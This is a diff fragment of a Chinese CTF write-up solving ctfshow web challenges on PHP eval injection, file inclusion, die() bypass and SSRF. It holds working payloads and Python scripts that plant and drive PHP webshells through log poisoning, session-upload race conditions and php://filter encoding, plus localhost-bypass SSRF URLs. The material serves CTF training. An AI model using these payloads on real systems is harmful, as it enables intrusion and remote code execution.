+   c=print_r(php_strip_whitespace("flag.php"));
+   c=include("flag.php");echo $flag;
+   ```
+
+
+
+### web60
+
+1. 代码审计
+
+   ```php
+   <?php
+   // 你们在炫技吗？
+   if(isset($_POST['c'])){
+           $c= $_POST['c'];
+           eval($c);
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 和原来一样，应该也是一样的禁用了一些函数`file` `file_get_contents` `readfile`，继续测试payload
+
+   ```shell
+   c=highlight_file('flag.php');
+   c=show_source("flag.php");
+   c=print_r(php_strip_whitespace("flag.php"));
+   c=require('flag.php');echo $flag;
+   ```
+
+
+
+### web61
+
+1. 代码审计
+
+   ```php
+   <?php
+   // 你们在炫技吗？
+   if(isset($_POST['c'])){
+           $c= $_POST['c'];
+           eval($c);
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 和上题同理，测试可用的payload
+
+   ```shell
+   c=highlight_file("flag.php");
+   c=show_source("flag.php");
+   c=require('flag.php');echo $flag;
+   c=print_r(php_strip_whitespace("flag.php"));
+   ```
+
+
+
+### web62
+
+1. 代码审计
+
+   ```php
+    <?php
+   // 你们在炫技吗？
+   if(isset($_POST['c'])){
+           $c= $_POST['c'];
+           eval($c);
+   }else{
+       highlight_file(__FILE__);
+   }
+   
+   ```
+
+2. 同理，测试有用的`payload`
+
+   ```shell
+   c=highlight_file("flag.php");
+   c=show_source("flag.php");
+   c=require('flag.php');echo $flag;
+   c=print_r(php_strip_whitespace("flag.php"));
+   ```
+
+   
+
+### web63
+
+1. 代码审计
+
+   ```php
+   <?php
+   // 你们在炫技吗？
+   if(isset($_POST['c'])){
+           $c= $_POST['c'];
+           eval($c);
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 同理，测试可以用的payload
+
+   ```shell
+   c=show_source("flag.php");
+   c=highlight_file("flag.php");
+   c=require('flag.php');echo $flag;
+   c=print_r(php_strip_whitespace("flag.php"));
+   ```
+
+   
+
+### web64
+
+1. 代码审计
+
+   ```php
+   <?php
+   // 你们在炫技吗？
+   if(isset($_POST['c'])){
+           $c= $_POST['c'];
+           eval($c);
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 同理，测试可以用的payload
+
+   ```shell
+   c=show_source("flag.php");
+   c=highlight_file("flag.php");
+   c=require('flag.php');echo $flag;
+   c=print_r(php_strip_whitespace("flag.php"));
+   ```
+
+
+
+### web65
+
+1. 代码审计
+
+   ```php
+   <?php
+   // 你们在炫技吗？
+   if(isset($_POST['c'])){
+           $c= $_POST['c'];
+           eval($c);
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 同理，测试可以用的payload
+
+   ```shell
+   c=show_source("flag.php");
+   c=highlight_file("flag.php");
+   c=require('flag.php');echo $flag;
+   c=print_r(php_strip_whitespace("flag.php"));
+   ```
+
+
+
+### web66
+
+1. 代码审计，跟原来没什么区别
+
+   ```php
+   <?php
+   // 你们在炫技吗？
+   if(isset($_POST['c'])){
+           $c= $_POST['c'];
+           eval($c);
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 这里`show_source`被禁用掉了,我们换成`highlight_file`发现flag不在这里
+   ```shell
+   c=highlight_file("flag.php");
+   ```
+
+3. 用`scandir`搜索一下根目录，发现`flag.txt`
+
+   ```shell
+   c=print_r(scandir("/"));
+   ```
+
+4. 构造`payload`
+
+   ```shell
+   c=highlight_file("/flag.txt");
+   ```
+
+
+
+### web67
+
+1. 代码审计，跟原来没什么区别
+
+   ```php
+   <?php
+   // 你们在炫技吗？
+   if(isset($_POST['c'])){
+           $c= $_POST['c'];
+           eval($c);
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 这里`show_source`被禁用掉了,我们换成`highlight_file`发现flag不在这里
+
+   ```shell
+   c=highlight_file("flag.php");
+   ```
+
+3. 用`scandir`搜索一下根目录，发现`print_r`被禁用了替换成`var_dump`一个道理，发现`flag.txt`
+
+   ```shell
+   c=var_dump(scandir("/"));
+   ```
+
+4. 构造`payload`
+
+   ```shell
+   c=highlight_file("/flag.txt");
+   ```
+
+
+
+### web68
+
+1. 上来就显示`highlight_file()`被禁用了，先看看目录有什么
+
+   ```shell
+   c=var_dump(scandir('/'));
+   ```
+
+2. 有flag.txt，尝试下其他函数
+
+   ```shell
+   c=include('/flag.txt');
+   c=require("/flag.txt");
+   ```
+
+
+
+### web69
+
+1. 上来就显示`highlight_file()`被禁用了，先看看目录有什么，发现`var_dump`也被禁用了，参考南方大佬读取目录的方式
+
+   ```shell
+   print_r(glob("*")); // 列当前目录
+   print_r(glob("/*")); // 列根目录
+   print_r(scandir("."));
+   print_r(scandir("/"));
+   $d=opendir(".");while(false!==($f=readdir($d))){echo"$f\n";}
+   $d=dir(".");while(false!==($f=$d->read())){echo$f."\n";}
+   $a=glob("/*");foreach($a as $value){echo $value."   ";}
+   $a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}
+   ```
+
+2. 因为`print_r`也被禁用了，所以可以用后面的几种方式，原理是通过遍历数组的形式进行读取
+
+   ```shell
+   c=$d=opendir("/");while(false!==($f=readdir($d))){echo"$f\n";}
+   ```
+
+3. 读取`flag.txt`
+
+   ```shell
+   c=include('/flag.txt');
+   ```
+
+
+
+### web70
+
+1. 同`web69`可以用后面的几种方式，原理是通过遍历数组的形式进行读取
+
+   ```shell
+   c=$d=opendir("/");while(false!==($f=readdir($d))){echo"$f\n";}
+   ```
+
+2. 读取`flag.txt`
+
+   ```shell
+   c=include('/flag.txt');
+   ```
+
+
+
+### web71
+
+1. 这里提供了源码，代码审计一波
+
+   ```php
+   <?php
+   error_reporting(0);
+   ini_set('display_errors', 0);
+   // 你们在炫技吗？
+   if(isset($_POST['c'])){
+           $c= $_POST['c'];
+           eval($c);
+           $s = ob_get_contents();//这里得到缓冲区的数据
+           ob_end_clean();//会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容。
+           echo preg_replace("/[0-9]|[a-z]/i","?",$s);//正则过滤并对过滤的内容进行替换
+   }else{
+       highlight_file(__FILE__);
+   }
+   
+   ?>
+   
+   你要上天吗？
+   ```
+
+2. 这里可以利用`exit()`停止后面的程序，不然的话就会被正则过滤替换成`?`
+
+   ```shell
+   c=require("/flag.txt");exit();
+   ```
+
+
+
+### web72
+
+不会
+
+### web73
+
+1. 没有源码，提示`highlight_file`被禁用，这里老样子先查看下flag位置,`exit()`结束掉后面的程序
+
+   ```shell
+   c=$d=opendir("/");while(false!==($f=readdir($d))){echo"$f\n";};exit();
+   ```
+
+2. 出来了个`flagc.txt`，`include`包含一下
+
+   ```shell
+   c=include("/flagc.txt");exit();
+   ```
+
+
+
+### web74
+
+1. 与上一题`web73`同理，查看下`flag`位置
+
+   ```shell
+   c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");};exit();
+   ```
+
+2. 出来了`flagx.txt`，`include`进行包含一下
+
+   ```shell
+   c=include("/flagx.txt");exit();
+   ```
+
+
 
 
 
@@ -249,7 +1729,7 @@
    } 
    ```
 
-2. 这里不能用伪协议了，根据题目提示包含日志文件，访问` ?file=/var/log/nginx/access.log`，发现有`User-Agent`回显
+2. 根据提示包含日志文件，访问` ?file=/var/log/nginx/access.log`，发现有`User-Agent`回显
 
    ![](img/image-20210609095106370.png)
 
@@ -290,6 +1770,625 @@
    ![](img/image-20210609101018434.png)
 
 4. 远程文件包含写🐎，应该也可以，可以尝试下。
+
+5. 后面测试了，可以用`php`伪协议大小写进行绕过
+
+   ```php
+   ?file=Php://input
+   
+   #POST提交
+   <?php system('tac fl0g.php')?>
+   ```
+
+   ![](img/image-20210707155001614.png)
+
+
+
+### web81
+
+1. 代码审计
+
+   ```php
+    <?php
+   if(isset($_GET['file'])){
+       $file = $_GET['file'];
+       $file = str_replace("php", "???", $file);
+       $file = str_replace("data", "???", $file);
+       $file = str_replace(":", "???", $file);
+       include($file);
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 这里把`:`给过滤了，伪协议就用不了，利用`nginx`日志包含吧，之前是手动发包，接下来用脚本来跑
+
+   ```python
+   # -*- coding: utf-8 -*-
+   '''
+   @Time : 2021/7/7 15:57
+   @Author : Seals6
+   @File : web81.py
+   @contact: 972480239@qq.com
+   @blog: seals6.github.io
+   
+   -*- 功能说明 -*-
+   
+   -*- 更新说明 -*-
+   
+   '''
+   import requests
+   url="http://0a7817f5-a384-4d5b-bfbf-9767f75dd5a5.challenge.ctf.show:8080/"
+   headers={
+       #'User-Agent':"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0<?php system('ls');?>"
+     
+       'User-Agent':"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0<?php system('tac fl0g.php');?>"
+   }
+   params={"file":"/var/log/nginx/access.log"}
+   
+   #根据个人需要是否用代理
+   #proxies = {'http': '127.0.0.1:8080'}
+   r=requests.get(url=url,params=params,headers=headers,proxies=proxies)
+   print(r.url)
+   print(r.text)
+   ```
+
+
+
+### web82
+
+1. 代码审计
+
+   ```php
+    <?php
+   if(isset($_GET['file'])){
+       $file = $_GET['file'];
+       $file = str_replace("php", "???", $file);
+       $file = str_replace("data", "???", $file);
+       $file = str_replace(":", "???", $file);
+       $file = str_replace(".", "???", $file);
+       include($file);
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 这里将`:`和`.`号过滤后，`php`伪协议不能用，后缀名文件也被过滤了，所以要利用`session`文件进行文件包含利用，这里要用到`PHP_SESSION_UPLOAD_PROGRESS`文件上传进度，进行文件包含利用，具体原理解释看后面的参考文章。
+
+3. 简单介绍一下`PHP_SESSION_UPLOAD_PROGRESS`，这个功能是在`php5.4`版本添加的，我们来看一下`php.ini`默认配置文件
+
+   >1. session.upload_progress.enabled = on
+   >2. session.upload_progress.cleanup = on
+   >3. session.upload_progress.prefix = "upload_progress_"
+   >4. session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
+   >5. session.upload_progress.freq = "1%"
+   >6. session.upload_progress.min_freq = "1"
+   >7. session.use_strict_mode=off
+
+   (1)`enabled=on`表示当浏览器向服务器`POST`发送一个文件名为`[session.upload_progress.name]同名变量时`会向`session`中将此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中。
+
+   (2)`cleanup=on`当文件上传完成后，会立即清空对应session文件中的内容
+
+   (3)+(4)是`session`对应文件中的键名
+
+   (7)`session.use_strict_mode=off`是指Cookie中`sessionid`可控，当我们自行设置`PHPSESSID=flag`时，PHP将会在服务器上创建一个文件：`/tmp/sess_flag`。即使此时用户没有初始化Session，PHP也会自动初始化Session。  并产生一个键值，这个键值有ini.get("session.upload_progress.prefix")+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。
+
+4. 所以当我们构造`PHP_SESSION_UPLOAD_PROGRESS`上传完成后，默认情况下就会立即清空`session`内容，那如何利用文件包含呢，就要用到条件竞争了，不断上传，不断请求`/tmp/sess_xxx`文件
+
+5. 接下来我讲讲手动发包和脚本来做，首先制作一个`upload`上传表单
+
+   ```html
+   <!DOCTYPE html>
+   <html lang="en">
+   <head>
+       <meta charset="UTF-8">
+       <title>session upload</title>
+   </head>
+   <body>
+     <!--修改服务器URL地址-->
+   <form action="" method="POST" enctype="multipart/form-data">
+     <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
+     <input type="file" name="file1" />
+     <input type="submit" />
+   </form>
+   </body>
+   </html>
+   ```
+
+6. 抓包，添加`Cookie:PHPSESSID=flag`，此时PHP将会在服务器上创建一个文件：`/tmp/sess_flag`，并在`PHP_SESSION_UPLOAD_PROGRESS`下添加恶意命令，一定要添加文件上传，不然不会将文件详细内容写入到`session`文件中
+
+   ![](img/image-20210708111223802.png)
+
+7. 构造访问`file=/tmp/sess_flag`包，利用`intruder`进行条件竞争，不断上传，不断访问
+
+   ![](img/image-20210708130359676.png)
+   
+   ![](img/image-20210708130437875.png)
+   
+8. 这时就可以看到`fl0g.php`，重新构造命令，条件竞争上传获取就可以了
+   
+   ![](img/image-20210708130653870.png)
+   
+   ![](img/image-20210708130803011.png)
+   
+9. 接下来用脚本进行实现
+
+   ```python
+   # -*- coding: utf-8 -*-
+   '''
+   @Time : 2021/7/7 17:32
+   @Author : Seals6
+   @File : web82.py
+   @contact: 972480239@qq.com
+   @blog: seals6.github.io
+   
+   -*- 功能说明 -*-
+   
+   -*- 更新说明 -*-
+   
+   '''
+   import io
+   import requests
+   import threading
+   
+   sessid = 'flag'
+   data = {"cmd": "system('cat fl0g.php');"}
+   #自行修改
+   url = ""
+   
+   def write(session):
+       while True:
+           f = io.BytesIO(b'a' * 1024 * 50)
+           resp = session.post(url,
+                               data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'},
+                               files={'file': ('1.txt', f)}, cookies={'PHPSESSID': sessid})
+   
+   
+   def read(session):
+       while True:
+           resp = session.post(url+'?file=/tmp/sess_' + sessid,data=data)
+           if '1.txt' in resp.text:
+               print(resp.text)
+               event.clear()
+           else:
+               pass
+   
+   
+   if __name__ == "__main__":
+       event = threading.Event()
+       with requests.session() as session:
+           for i in range(1, 30):
+               threading.Thread(target=write, args=(session,)).start()
+   
+           for i in range(1, 30):
+               threading.Thread(target=read, args=(session,)).start()
+       event.set()
+   ```
+
+   ![](img/image-20210708130945576.png)
+
+参考文章：
+
+   [利用session.upload_progress进行文件包含和反序列化渗透](https://www.freebuf.com/vuls/202819.html)
+
+   [Session 上传进度](https://www.php.net/manual/zh/session.upload-progress.php)
+
+   [npfs-利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含](https://www.cnblogs.com/NPFS/p/13795170.html)
+
+   
+
+### web83
+
+1. 代码审计
+
+   ```php
+   <?php
+   session_unset();
+   session_destroy();
+   //销毁了session
+   if(isset($_GET['file'])){
+       $file = $_GET['file'];
+       $file = str_replace("php", "???", $file);
+       $file = str_replace("data", "???", $file);
+       $file = str_replace(":", "???", $file);
+       $file = str_replace(".", "???", $file);
+   
+       include($file);
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 只是访问时销毁了`session`，但是仍然可以进行重新创建，可以利用`web82`脚本进行条件竞争
+
+
+
+
+### web84
+
+1.  代码审计
+
+   ```php
+   <?php
+   if(isset($_GET['file'])){
+       $file = $_GET['file'];
+       $file = str_replace("php", "???", $file);
+       $file = str_replace("data", "???", $file);
+       $file = str_replace(":", "???", $file);
+       $file = str_replace(".", "???", $file);
+       system("rm -rf /tmp/*");
+     //删除了/tmp/sess_临时session文件
+       include($file);
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 只是删除临时文件，仍然可以用`web82`的条件竞争脚本
+
+
+
+### web85
+
+1. 代码审计
+
+   ```php
+    <?php
+   if(isset($_GET['file'])){
+       $file = $_GET['file'];
+       $file = str_replace("php", "???", $file);
+       $file = str_replace("data", "???", $file);
+       $file = str_replace(":", "???", $file);
+       $file = str_replace(".", "???", $file);
+       if(file_exists($file)){
+           $content = file_get_contents($file);
+           if(strpos($content, "<")>0){
+               die("error");
+           }
+           include($file);
+       }
+       
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 还是`web82`的原理，但是这里会检测生成的`/tmp/sess_xxxx`文件是否有`<`，如果有就会停止，所以原来的脚本脚本竞争很难成功，我们优化一下，直接构造命令，不再写🐎
+
+   ```python
+   # -*- coding: utf-8 -*-
+   '''
+   @Time : 2021/7/8 16:49
+   @Author : Seals6
+   @File : web85.py
+   @contact: 972480239@qq.com
+   @blog: seals6.github.io
+   
+   -*- 功能说明 -*-
+   
+   -*- 更新说明 -*-
+   
+   '''
+   import io
+   import requests
+   import threading
+   url = 'http://771fcdbe-7f88-48f1-ba7d-c2df30183f61.challenge.ctf.show:8080/'
+   
+   def write(session):
+       data = {
+           'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("tac f*");?>seals6'
+       }
+       while True:
+           f = io.BytesIO(b'a' * 1024 * 10)
+           response = session.post(url,cookies={'PHPSESSID': 'flag'}, data=data, files={'file': ('dota.txt', f)})
+   def read(session):
+       while True:
+           response = session.get(url+'?file=/tmp/sess_flag')
+           if 'seals6' in response.text:
+               print(response.text)
+               break
+           else:
+               print('retry')
+   
+   if __name__ == '__main__':
+       session = requests.session()
+       for i in range(30):
+           threading.Thread(target=write, args=(session,)).start()
+       for i in range(30):
+           threading.Thread(target=read, args=(session,)).start()
+   ```
+
+
+
+### web86
+
+1. 代码审计
+
+   ```php
+    <?php
+   define('还要秀？', dirname(__FILE__));
+   set_include_path(还要秀？);
+   //定义了一个包含路径，但是flag脚本路径就在此目录
+   if(isset($_GET['file'])){
+       $file = $_GET['file'];
+       $file = str_replace("php", "???", $file);
+       $file = str_replace("data", "???", $file);
+       $file = str_replace(":", "???", $file);
+       $file = str_replace(".", "???", $file);
+       include($file);
+   
+       
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 这个路径刚好就是flag的目录，所以直接`web82`的条件竞争脚本即可
+
+
+
+### web87
+
+1. 代码审计
+
+   ```php
+    <?php
+   if(isset($_GET['file'])){
+       $file = $_GET['file'];
+       $content = $_POST['content'];
+       $file = str_replace("php", "???", $file);
+       $file = str_replace("data", "???", $file);
+       $file = str_replace(":", "???", $file);
+       $file = str_replace(".", "???", $file);
+       file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);
+   
+       
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 这里要绕过死亡`die`程序，因为没有绕过的话，代码就结束了，不会执行我们的马儿，有三种方法，详细原理可参考`P神-php://filter妙用`文章，放在了参考文章后面。因为php版本太高的原因，第二种`strip_tag`不能使用，先讲讲使用`base64`编码的方法。
+
+3. base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。所以`<?php die('大佬别秀了');?>`对其解码后，只有`phpdie`六个字符组成字符串进行解码，这样就可以绕过`die`
+
+4. 刚好`file_put_contents`是写文件，文件名支持`php伪协议`，所以可以先将内容写进文件，再进行解码，刚好文件名要进行`url`解码一次，那我们将`php伪协议`双重编码一下，就可以绕过了。
+
+   ```shell
+   #1.双重url编码，burp就可以
+   php://filter/write=convert.base64-decode/resource=shell.php
+   
+   %25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30
+   
+   #2.对传入的一句话木马进行base64编码
+   <?php eval($_POST['cmd']);?>
+   
+   PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==
+   
+   #3.填充字符，避免一句话木马解码失败，解码后剩phpdie，一共6个字符，所以需要再加2个字符变8个
+   #因为base64算法解码时是4个byte一组，也就是8个字符一组
+   content=aaPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==
+   ```
+
+   ![](img/image-20210708202622972.png)
+
+5. 访问我们写好的`shell.php`，利用工具提交
+
+   ![](img/image-20210708202721801.png)
+
+6. 为了方便，写了一份py脚本
+
+   ```python
+   # -*- coding: utf-8 -*-
+   '''
+   @Time : 2021/7/8 17:53
+   @Author : Seals6
+   @File : web87.py
+   @contact: 972480239@qq.com
+   @blog: seals6.github.io
+   
+   -*- 功能说明 -*-
+   
+   -*- 更新说明 -*-
+   
+   '''
+   import urllib
+   import requests
+   import base64
+   from urllib.parse import urlparse
+   
+   url="http://4ef7df70-9999-44b6-b90a-d5fca5939633.challenge.ctf.show:8080/"
+   str="<?php eval($_POST['abc']);?>"
+   b64str="aa"+bytes.decode(base64.b64encode(str.encode("UTF-8")))
+   # print(b64str)
+   data={"content":b64str}
+   #这里只编码了一次，因为requests提交时会再编码一次
+   tmp_prefix="%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%77%72%69%74%65%3d%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%64%65%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%73%68%65%6c%6c%2e%70%68%70"
+   params={"file":tmp_prefix}
+   
+   while True:
+       r=requests.post(url=url,params=params,data=data)
+       # print(r.url)
+       r2=requests.get(url=url+"shell.php")
+       shell={"abc":input("[*]请输入代码执行内容: ")+";"+"echo '123';"}
+       if r2.status_code==200:
+           print("[*]"+"-"*10+"done"+"-"*10)
+           r3=requests.post(url=url+"shell.php",data=shell)
+           if '123' in r3.text:
+               print(r3.text)
+           else:
+               print("retry")
+   ```
+
+   ![](img/image-20210708203617014.png)
+
+7. 这里讲讲`rot-13`的方法，原理和上面类似，核心是将“死亡exit”去除。`<?php exit; ?>`在经过rot13编码后会变成`<?cuc rkvg; ?>`，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了
+
+   ```shell
+   #1.先将伪协议进行双重编码
+   php://filter/write=string.rot13/resource=2.php
+   
+   %25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%32%25%32%65%25%37%30%25%36%38%25%37%30
+   
+   #2.将我们的一句话木马rot13编码，这样写文件之后会被解回来
+   <?php eval($_POST['abc']);?>
+   
+   <?cuc riny($_CBFG['nop']);?>
+   ```
+
+   ![](img/image-20210708205525067.png)
+
+8. 访问我们的马儿，工具提交就行
+
+   ![](img/image-20210708205612750.png)
+
+参考文章：
+
+[P神-谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)
+
+
+
+### web88
+
+1. 代码审计
+
+   ```php
+    <?php
+   if(isset($_GET['file'])){
+       $file = $_GET['file'];
+       if(preg_match("/php|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=|\./i", $file))
+         //过滤了一堆，但是data伪协议没有过滤
+       {
+           die("error");
+       }
+       include($file);
+   }else{
+       highlight_file(__FILE__);
+   }
+   
+   ```
+
+2. 可以利用`data伪协议`，但是base64编码后要注意不能有`+` 和`=`
+
+   ```shell
+   <?php system('ls');?>
+   
+   #base64编码后
+   PD9waHAgc3lzdGVtKCdscycpOz8+
+   
+   #有+号过滤后，在解码就不能执行代码了，填充一下,再编码
+   <?php system('ls');echo "123";?>
+   PD9waHAgc3lzdGVtKCdscycpO2VjaG8gIjEyMyI7Pz4=
+   
+   #去掉填充=号，不影响解码
+   PD9waHAgc3lzdGVtKCdscycpO2VjaG8gIjEyMyI7Pz4
+   
+   #payload
+   ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpO2VjaG8gIjEyMyI7Pz4
+   
+   ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwqJyk7ZWNobyAiMTIzIjs/Pg
+   ```
+
+
+
+### web116
+
+1. 打开链接，是电影混剪，把视频下载下来，扔进`010`发现有个`png`是源码，老杂项选手了
+
+   ![](img/截屏2021-07-09 11.05.53.png)
+
+2. 抓包`?file=flag.php`，不知道为什么一定要抓包才会回显，离谱建议多试试
+
+
+
+
+### web117
+
+1. 代码审计
+
+   ```php
+    <?php
+   highlight_file(__FILE__);
+   error_reporting(0);
+   function filter($x){
+       if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x)){
+           die('too young too simple sometimes naive!');
+       }
+   }
+   $file=$_GET['file'];
+   $contents=$_POST['contents'];
+   filter($file);
+   file_put_contents($file, "<?php die();?>".$contents);
+   
+   ```
+
+2. 原理和`web87`类型，需要绕过`die`死亡程序，但是这次对，传输的内容进行了，不能使用`base64`和`rot-13`了，采用新的方法，原理在下面参考文章中，这里因为比较繁琐，没有手工去做，用脚本写的。
+
+   ```python
+   # -*- coding: utf-8 -*-
+   '''
+   @Time : 2021/7/9 11:36
+   @Author : Seals6
+   @File : web117.py
+   @contact: 972480239@qq.com
+   @blog: seals6.github.io
+   
+   -*- 功能说明 -*-
+   
+   -*- 更新说明 -*-
+   
+   '''
+   import requests
+   url="http://3b868af7-b026-4a3a-a7f9-35982c1d42fa.challenge.ctf.show:8080/"
+   file_prefix="php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php"
+   params={"file":file_prefix}
+   data={"contents":'?<hp pvela$(P_SO[Tc"dm]";)>?'}
+   
+   r=requests.post(url=url,params=params,data=data)
+   while True:
+       r1=requests.get(url=url+"shell.php")
+       if r1.status_code==200:
+           print("done")
+           shell = {"cmd": input("[*]请输入代码执行内容: ") + ";" + "echo '123';"}
+           r1= requests.post(url=url + "shell.php", data=shell)
+           if '123' in r1.text:
+               print(r1.text)
+           else:
+               print("retry")
+   
+   else:
+       print("retry")
+   ```
+
+   ![](img/image-20210709124650321.png)
+
+
+
+参考文章：
+
+[file_put_content和死亡·杂糅代码之缘](https://xz.aliyun.com/t/8163#toc-3)
+
+
+
+## 5.php特性
+
+## 6.文件上传
+
+### web151
+
+1. 绕过js前端验证，修改写好的一句话木马后缀为`ma.png`，`jpg`试过了不行
+
+2. 抓包，重新改为`ma.php`，上传成功，访问路径，命令执行
+
+   ![](img/image-20210712134130986.png)
+
+   ![](img/image-20210712134200064.png)
+
+
+
+### web152
+
+1. 跟上题一样，修改为png后缀，抓包绕过js校验，在修改文件名为`ma.php`，木马连接，命令执行即可
 
 
 
@@ -1261,3 +3360,398 @@
 
    ![](img/image-20210616195840491.png)
 
+
+
+
+
+## SSRF
+
+### web351
+
+1. 代码审计
+
+   ```php
+    <?php
+   error_reporting(0);
+   highlight_file(__FILE__);
+   $url=$_POST['url'];
+   //初始化
+   $ch=curl_init($url);
+   //设置属性
+   curl_setopt($ch, CURLOPT_HEADER, 0);
+   //将curl_exec()获取的信息以字符串返回，而不是直接输出。
+   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+   //执行结果
+   $result=curl_exec($ch);
+   //关闭url请求
+   curl_close($ch);
+   echo ($result);
+   ?> 
+   ```
+
+2. 这里利用`ssrf`读取下本机文件看看
+
+   ```shell
+   #POST提交
+   url=file:///var/www/html/flag.php
+   ```
+
+   ![](img/image-20210621152630565.png)
+
+3. 后面还有一串，看看代码
+
+   ```php
+   <?php
+   
+   $flag="ctfshow{79220bfb-81a6-4090-b4ed-dc37d008f066}";
+   if($_SERVER['REMOTE_ADDR']=='127.0.0.1')
+     //判断当前浏览的用户的IP地址是否等于127.0.0.1
+   {
+   		echo $flag;
+   }
+   else{
+   		die("非本地用户禁止访问");
+   }
+   ?>
+   ```
+
+4. 那么我们还可以这样直接请求
+
+   ```shell
+   #POST请求
+   url=127.0.0.1/flag.php
+   ```
+
+
+
+### web352
+
+1. 依旧代码审计
+
+   ```php
+   <?php
+   error_reporting(0);
+   highlight_file(__FILE__);
+   $url=$_POST['url'];
+   //解析一个URL并返回一个关联数组，包含在 URL 中出现的各种组成部分。
+   $x=parse_url($url);
+   if($x['scheme']==='http'||$x['scheme']==='https')
+   {
+   if(!preg_match('/localhost|127.0.0/'))
+     //正则如果没有匹配localhost或者127.0.0,这里都没要匹配的字符串变量...默认肯定为真
+   {
+   $ch=curl_init($url);
+   curl_setopt($ch, CURLOPT_HEADER, 0);
+   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+   $result=curl_exec($ch);
+   curl_close($ch);
+   echo ($result);
+   }
+   else{
+       die('hacker');
+   }
+   }
+   else{
+       die('hacker');
+   } 
+   ```
+
+2. 所以只需要满足http或者https前缀就行了，直接构造
+
+   ```shell
+   #POST请求
+   url=http://127.0.0.1/flag.php
+   ```
+
+   ![](img/image-20210621210742077.png)
+
+
+
+
+
+### web353
+
+1. 依旧代码审计
+
+   ```php
+    <?php
+   error_reporting(0);
+   highlight_file(__FILE__);
+   $url=$_POST['url'];
+   $x=parse_url($url);
+   if($x['scheme']==='http'||$x['scheme']==='https'){
+   if(!preg_match('/localhost|127\.0\.|\。/i', $url))
+     //正则过滤了localhost,127.0.,。号
+   {
+   $ch=curl_init($url);
+   curl_setopt($ch, CURLOPT_HEADER, 0);
+   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+   $result=curl_exec($ch);
+   curl_close($ch);
+   echo ($result);
+   }
+   else{
+       die('hacker');
+   }
+   }
+   else{
+       die('hacker');
+   }
+   ?> 
+   ```
+
+2. 这里要进行绕过，可以利用进制转换，[在线转换网址](https://tool.520101.com/wangluo/jinzhizhuanhuan/)
+
+   ```shell
+   十六进制
+   url=http://0x7F.0.0.1/flag.php
+   八进制
+   url=http://0177.0.0.1/flag.php
+   10 进制整数格式
+   url=http://2130706433/flag.php
+   16 进制整数格式，还是上面那个网站转换记得前缀0x
+   url=http://0x7F000001/flag.php
+   还有一种特殊的省略模式
+   127.0.0.1写成127.1
+   用CIDR绕过localhost
+   url=http://127.127.127.127/flag.php
+   还有很多方式不想多写了
+   url=http://0/flag.php
